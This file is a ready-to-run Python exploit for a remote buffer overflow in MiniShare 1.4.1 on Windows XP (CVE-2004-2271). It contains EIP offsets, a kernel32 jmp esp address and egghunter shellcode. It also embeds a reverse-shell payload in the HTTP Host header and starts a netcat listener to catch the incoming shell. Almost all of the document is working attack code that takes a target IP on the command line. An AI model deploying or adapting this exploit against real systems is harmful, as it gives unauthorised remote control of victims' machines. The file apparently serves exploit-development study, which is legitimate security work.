#!/usr/bin/env python
# CVE             = CVE-2004-2271
# Software        = MiniShare Version 1.4.1
# Platform        = Windows XP Pro SP3 32-bit
# Vulnerability   = Buffer Overflow - Egghunter
# Local or Remote = Remote
# Badchars        = "\x00\x0a\x0d"
# Author          = pinecone
# Last modified   = Jan 31st 2019
# Usage           = python minishare.py <target IP> <target port> <attacker port>

import os
import socket
import struct
import sys
import time

if len(sys.argv) < 4:
  print "Usage   : python minishare.py <target IP> <target port> <attacker port>"
  print "Example : python minishare.py 127.0.0.1 80 9001"
  sys.exit(0)

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
attacker_port = int(sys.argv[3])

# OFFSETS & ADDRESSES
# -----------------------------------------------------------
# msf-pattern_create -l 2000
# !mona findmsp
    # EIP contains normal pattern : 0x68433568 (offset 1786)
    # ESP (0x013b3908) points at offset 1790 in normal pattern (length 210)
      # ONLY HAVE 210 BYTES OF SPACE FOR SHELLCODE -> SO HAVE TO USE EGGHUNTER

# !mona jmp -r esp 
    # 0x7c86467b : jmp esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\kernel32.dll)

    # OTHER LANGUAGES jmp esp INSTRUCTIONS
    # Pulled from Metasploit - https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/http/minishare_get_overflow.rb
      # Windows XP SP3 French = 0x7e3a9353

offset_to_eip = "A" * 1786 
jmp_esp = struct.pack('<I', 0x7c86467b)

# EGGHUNTER SHELLCODE
# -----------------------------------------------------------
#!mona egg -t w00t
key = "w00tw00t"
egghunter_shellcode = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# EXPLOIT SHELLCODE
# -----------------------------------------------------------
# msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -b "\x00\x0a\x0d" -f python -v exploit_shellcode
exploit_shellcode  = key  # don't remove
exploit_shellcode += b"\xbd\xc1\x54\x2c\xbe\xd9\xf7\xd9\x74"
exploit_shellcode += b"\x24\xf4\x58\x2b\xc9\xb1\x52\x83\xc0"
exploit_shellcode += b"\x04\x31\x68\x0e\x03\xa9\x5a\xce\x4b"
exploit_shellcode += b"\xd5\x8b\x8c\xb4\x25\x4c\xf1\x3d\xc0"
exploit_shellcode += b"\x7d\x31\x59\x81\x2e\x81\x29\xc7\xc2"
exploit_shellcode += b"\x6a\x7f\xf3\x51\x1e\xa8\xf4\xd2\x95"
exploit_shellcode += b"\x8e\x3b\xe2\x86\xf3\x5a\x60\xd5\x27"
exploit_shellcode += b"\xbc\x59\x16\x3a\xbd\x9e\x4b\xb7\xef"
exploit_shellcode += b"\x77\x07\x6a\x1f\xf3\x5d\xb7\x94\x4f"
exploit_shellcode += b"\x73\xbf\x49\x07\x72\xee\xdc\x13\x2d"
exploit_shellcode += b"\x30\xdf\xf0\x45\x79\xc7\x15\x63\x33"
exploit_shellcode += b"\x7c\xed\x1f\xc2\x54\x3f\xdf\x69\x99"
exploit_shellcode += b"\x8f\x12\x73\xde\x28\xcd\x06\x16\x4b"
exploit_shellcode += b"\x70\x11\xed\x31\xae\x94\xf5\x92\x25"
exploit_shellcode += b"\x0e\xd1\x23\xe9\xc9\x92\x28\x46\x9d"
exploit_shellcode += b"\xfc\x2c\x59\x72\x77\x48\xd2\x75\x57"
exploit_shellcode += b"\xd8\xa0\x51\x73\x80\x73\xfb\x22\x6c"
exploit_shellcode += b"\xd5\x04\x34\xcf\x8a\xa0\x3f\xe2\xdf"
exploit_shellcode += b"\xd8\x62\x6b\x13\xd1\x9c\x6b\x3b\x62"
exploit_shellcode += b"\xef\x59\xe4\xd8\x67\xd2\x6d\xc7\x70"
exploit_shellcode += b"\x15\x44\xbf\xee\xe8\x67\xc0\x27\x2f"
exploit_shellcode += b"\x33\x90\x5f\x86\x3c\x7b\x9f\x27\xe9"
exploit_shellcode += b"\x2c\xcf\x87\x42\x8d\xbf\x67\x33\x65"
exploit_shellcode += b"\xd5\x67\x6c\x95\xd6\xad\x05\x3c\x2d"
exploit_shellcode += b"\x26\x20\xca\x2d\x0e\x5c\xce\x2d\x4d"
exploit_shellcode += b"\xb4\x47\xcb\xfb\xd6\x01\x44\x94\x4f"
exploit_shellcode += b"\x08\x1e\x05\x8f\x86\x5b\x05\x1b\x25"
exploit_shellcode += b"\x9c\xc8\xec\x40\x8e\xbd\x1c\x1f\xec"
exploit_shellcode += b"\x68\x22\xb5\x98\xf7\xb1\x52\x58\x71"
exploit_shellcode += b"\xaa\xcc\x0f\xd6\x1c\x05\xc5\xca\x07"
exploit_shellcode += b"\xbf\xfb\x16\xd1\xf8\xbf\xcc\x22\x06"
exploit_shellcode += b"\x3e\x80\x1f\x2c\x50\x5c\x9f\x68\x04"
exploit_shellcode += b"\x30\xf6\x26\xf2\xf6\xa0\x88\xac\xa0"
exploit_shellcode += b"\x1f\x43\x38\x34\x6c\x54\x3e\x39\xb9"
exploit_shellcode += b"\x22\xde\x88\x14\x73\xe1\x25\xf1\x73"
exploit_shellcode += b"\x9a\x5b\x61\x7b\x71\xd8\x91\x36\xdb"
exploit_shellcode += b"\x49\x3a\x9f\x8e\xcb\x27\x20\x65\x0f"
exploit_shellcode += b"\x5e\xa3\x8f\xf0\xa5\xbb\xfa\xf5\xe2"
exploit_shellcode += b"\x7b\x17\x84\x7b\xee\x17\x3b\x7b\x3b"

# EXPLOIT
# -----------------------------------------------------------
get_request = (
"GET /" + offset_to_eip + jmp_esp + egghunter_shellcode + " HTTP/1.1\r\n\r\n"
"Host: " + exploit_shellcode + "\r\n\r\n"
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connecting to MiniShare at " + target_ip + " port " + str(target_port)
s.connect((target_ip, target_port))
print "[+] Sending exploit... "
time.sleep(1)
s.send(get_request)
s.close()
print "[+] Exploit sent! You should receive a shell (shortly)"

os.system("nc -lvnp " + str(attacker_port))